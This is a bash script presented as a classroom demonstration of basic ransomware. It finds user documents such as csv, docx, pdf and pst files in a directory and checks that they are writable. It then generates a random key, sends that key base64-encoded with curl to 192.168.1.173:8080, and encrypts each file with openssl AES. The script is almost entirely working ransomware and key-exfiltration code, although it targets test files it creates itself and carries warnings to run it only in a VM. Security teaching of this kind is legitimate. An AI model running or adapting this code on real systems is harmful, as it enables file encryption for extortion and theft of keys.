### Note: DO NOT RUN THIS OUTSIDE A VM
### This is for a demonstration in a security class
### It shows:
###   - Living off the land
###   - Ransomware at s basic level
###   - Networking/exfiltrating keys
###   - Questionable implementation of crypto

### If you want to see it in action... 
### WATCH MY VIDEO AT TCH.CX!!!! Or do it in VM.
### I'll put bounds in the conditions to reduce the
### chances of blowing up ur shit

#!/usr/bin/env bash

# Make sure file can be modified
# For each candidate file, we ensure:
# - It exists (-e)
# - It is readable (-r)
# - Ir is writiable (-w)

check_file() {

    # Can we see its existence?
    if ! [[ -e "$1" ]]; then
        echo -e "\tCouldn't find $1."
        return 1
    fi

    # Can we see its contents?
    if ! [[ -r "$1" ]]; then
        echo -e "\tNo read access."
        return 1
    else
        echo -e "\tRead access."
    fi

    # Can we change its contents>
    if ! [[ -w "$1" ]]; then
        echo -e "\tNo write access."
        return 1
    else
        echo -e "\tWrite access."
    fi

    return 0
}


# Find user file within the specified directory
# Ensure directory exists and we can access it
# Search within accessible directories for user files
# Check file permissions with check_files()

find_files() {
    local -n ref_exposed_files="$2"
    local search_dir="$1" # Use a local variable for clarity

    # Directory exists?
    if ! [[ -d "$search_dir" ]]; then
        echo "Can't find $search_dir."
        return 1
    else
        echo "Found $search_dir."
    fi

    # We have permissions?
    if ! [[ -x "$search_dir" && -r "$search_dir" ]]; then
        echo -e "\tCan't access $search_dir (permissions)"
        return 1
    else
        echo -e "\tWe can access directory."
    fi

    # Search in directory
    ext_regex='.*\.\(csv\|xslx\|docx\|rtf\|pdf\|ost\|pst\|zip\|rar\|7z\|png\|txt\)$'
    
    # Use an intermediate array to store files found by find
    local -a found_files=()
    # mapfile -d $'\0' reads null-delimited input into an array
    # It must be run outside a pipe for the array to persist
    mapfile -d $'\0' -t found_files < <(find "$search_dir" -maxdepth 1 -type f -iregex "$ext_regex" -print0)

    # Now iterate over the collected files
    for file in "${found_files[@]}"; do
        # Remove the leading directory if present, as find might return "./file"
        local base_file=$(basename "$file")
        echo "Found file type associated with users: $base_file. Checking permissions..."
        # Pass the full path to check_file
        if check_file "$file"; then
            ref_exposed_files+=("$(readlink -f $file)")
            echo -e "\tAccessible. Added to list."
        else
            echo -e "\tInaccessible. Skipping"
        fi
    done
    
    return 0
}

# Generate an actual encryption from the keying material
# In a wierd and questionable way
# 
encrypt_file() {
  hash_input="$(stat -c %U:%G $1)$(readlink -f $1)$key"
  aes_sk="$(echo -n "hash_input" | sha256sum | tr -d ' -' )" 
  echo -e "FILE $1\n  SHA256($hash_input)\n    =>AES KEY $aes_sk"
  openssl enc -aes-256-ctr -pass pass:"$aes_sk" -iter 100 -a -in $1 -out $1.aes256.100
  
  # Unset these; don't want good guys getting them
  unset $hash_input
  unset $aes_sk
}

declare -a exposed_files
key=$(openssl rand -hex 32)
echo -e "Generated 256 bits of keying materal"
echo -e "\t =KEY: $key"

curl -X POST -H "Special-Delivery: $(echo -n $key | base64)" 192.168.1.173:8080 2> /dev/null

# Create a test directory and files for demonstration
mkdir -p rx_dir
touch rx_dir/account{1..12}{01,15}{24,25}.csv
touch rx_dir/hr{Apr,June,Oct}{23,25}.docs

# Directory is Read+Execute
# Files within are r, rw, w, and no permissions (tesT)
find_files rx_dir "exposed_files"

echo "---------ENCRYPTING---------"
echo ":"
for file in "${exposed_files[@]}"; do
    encrypt_file $file
done

